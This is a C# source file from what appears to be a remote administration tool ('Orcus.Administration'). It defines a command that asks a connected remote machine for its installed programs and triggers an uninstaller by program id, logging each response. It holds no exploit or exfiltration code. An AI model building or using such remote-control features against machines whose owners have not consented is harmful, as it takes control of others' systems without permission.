using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Commands.Extensions;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.UninstallPrograms;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.UninstallPrograms
{
    [DescribeCommandByEnum(typeof (UninstallProgramsCommunication))]
    public class UninstallProgramsCommand : Command
    {
        public event EventHandler<List<AdvancedUninstallableProgram>> RefreshList;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((UninstallProgramsCommunication) parameter[0])
            {
                case UninstallProgramsCommunication.ResponseInstalledPrograms:
                    var serializer = new Serializer(typeof (List<AdvancedUninstallableProgram>));
                    var list = serializer.Deserialize<List<AdvancedUninstallableProgram>>(parameter, 1);
                    RefreshList?.Invoke(this, list);
                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedPrograms"],
                        list.Count,
                        FormatBytesConverter.BytesToString(parameter.Length - 1)));
                    break;
                case UninstallProgramsCommunication.ResponseProgramUninstallerStarted:
                    LogService.Receive((string) Application.Current.Resources["UninstallProgramStarted"]);
                    break;
                case UninstallProgramsCommunication.ResponseUninstallFailed:
                    LogService.Error(string.Format((string) Application.Current.Resources["UninstallFailed"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case UninstallProgramsCommunication.ResponseEntryNotFound:
                    LogService.Receive((string) Application.Current.Resources["UninstalIdNotFound"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetInstalledPrograms()
        {
            LogService.Send((string) Application.Current.Resources["GetPrograms"]);
            ConnectionInfo.SendCommand(this, new[] {(byte) UninstallProgramsCommunication.ListInstalledPrograms});
        }

        public void UninstallProgram(AdvancedUninstallableProgram uninstallableProgram)
        {
            var package = new List<byte> {(byte) UninstallProgramsCommunication.UninstallProgram};
            package.AddRange(BitConverter.GetBytes(uninstallableProgram.Id));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Receive(string.Format((string) Application.Current.Resources["UninstallProgram"],
                uninstallableProgram.Name, uninstallableProgram.Id));
        }

        protected override uint GetId()
        {
            return 17;
        }
    }
}